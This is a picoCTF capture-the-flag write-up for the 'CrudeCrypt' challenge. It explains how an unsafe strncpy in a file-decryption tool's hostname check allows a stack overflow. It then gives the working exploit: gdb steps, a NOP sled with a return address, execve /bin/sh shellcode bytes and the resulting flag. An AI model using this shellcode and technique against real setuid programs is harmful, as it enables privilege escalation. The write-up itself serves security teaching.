**Name**: CrudeCrypt  
**Points**: 180  
**Type**: Binary Exploitation  
**Description**:  
Without proper maintainers, development of [Truecrypt](http://truecrypt.sourceforge.net/) has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the [code](https://picoctf.com/problem-static/binary/CrudeCrypt/crude_crypt.c) and read the contents of `flag.txt` from the server! The problem is at `/home/crudecrypt/crude_crypt` on the shell server.  
**Hint**:  
You can never trust user input!  
**Files**: crude_crypt.c

*****
# Code review

Here is what the relevant functions do:

##### main
- check if there are 3 arguments
- check if 1st argument is "encrypt" or "decrypt", and assign action function pointer
- if encrypt, setegid()
- open 2nd and 3rd argument as files
- read out file_password from stdin (max 128 bytes; possibly not null terminated)
- digest = MD5(password)
- call action(infile, outfile, digest)
- cleanup + exit

##### decrypt_file
- get file size of infile (using fstats)
- calloc buffer of that size
- copy contents of infile to buffer
- try decrypt_buffer (this function should work as intended)  
  - if fail, return
- create file_header based on decrypted data; we can put whatever we want in the header!
- check if magic number is correct  
  - if not, return
- call check_hostname  
  - print error message if it doesn't match
- write_size = MIN(header->file_size, infile size - header size); possible signed/unsigned bug!
- write decrypted data to outfile

##### check_hostname
- unsafe strncpy from header->host to stack buffer of size 32
- call safe_gethostname
- return after calling strcmp

```C
bool check_hostname(file_header* header) {
    char saved_host[HOST_LEN], current_host[HOST_LEN];
    strncpy(saved_host, header->host, strlen(header->host));
    safe_gethostname(current_host, HOST_LEN);
    return strcmp(saved_host, current_host) == 0;
}
```

*****
# Exploitation

The bug we are going to exploit is in the function check_hostname. The strncpy is used unsafely, because it is being told to copy the contents from src to dest (for the length of **src**). A safe usage would copy the contents from src to dest (for the length of **dest**)! Using strncpy in this way is the same as using strcpy, which is unsafe if src is provided by the user. By copying a src string that is larger than dest, we can cause a stack overflow which we can use to overwrite eip.

We can exploit this, because after the decryption of the infile, the header is created based on the decrypted data without any checks. This means we control whatever is in the header struct. This includes host, which is usally a 32-byte, null-terminated string. By removing the null bytes at the end, we can increase the length of the host string to cause the stack overflow.

In order to verify if this bug works, we will try to encrypt a file full of "a"s, but right before the call to encrypt the data, we will tamper with the header. This will result in an encrypted file that will result in a SEGFAULT when decrypted. I will use password "a", but it doesn't really matter.

##### Testing the exploit:
```
$ cp -r /home/crudecrypt/ /tmp/delilled
$ cd /tmp/delilled/crudecrypt
$ python -c 'print "a"*100' > a_file
$ <use gdb to read a_file, overwrite any null characters in host, and store the result in enc_file>
$ ulimit -c unlimited
$ ./crude_crypt decrypt enc_file dec_file
-> File password: a
Segmentation fault (core dumped)
$ gdb -q crude_crypt core 
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x61616161 in ?? ()
```

Ok, so we know we have control of eip and the stack. After checking that the stack is executable ($ readelf crude_crypt -a | grep GNU_STACK), which it is, we will place nop slide + shellcode in our input and overwrite eip with the address of the middle of the nop slide.

Using gdb, we can determine that the host variable is located at `0xffffd5c0` and the return address is located at `0xffffd60c`. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to `0xffffd64c`. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s). For fault tolerance, I will also be repeating the sled address 8 times, because the return address is located 4 bytes from where the data starts.

##### The structure of the exploit data will be:
`(sled address)*8 + (\x90)*128 + shellcode`

##### Shellcode:
`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

##### Executing the exploit:
```bash
$ python -c 'print "\x4c\xd6\xff\xff"*8 + "\x90"*128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"' > exploit_data
$ <use gdb to read exploit_data, overwrite any null characters in host, and store the result in exp_file>
$ cd /home/crude_crypt
$ ./crude_crypt decrypt /tmp/delilled/crudecrypt/exp_file /tmp/delilled/crudecrypt/dec_file
-> File password: a
$ cat flag.txt
writing_software_is_hard
```

If you're having trouble with landing on the nop sled, you can push it around by changing the arguments. Since the 3^rd argument (outfile) doesn't matter, as long as it can be opened, you could try playing with this. Alternatively, you could create a bigger nop sled. I just got lucked that it worked right away, but I had trouble running it my tmp directory.

*****

REFERENCES:
- [stat struct](http://codewiki.wikidot.com/c:struct-stat)
- [fstat](http://linux.die.net/man/2/fstat)
- [mcrypt library](http://mcrypt.hellug.gr/lib/mcrypt.3.html)
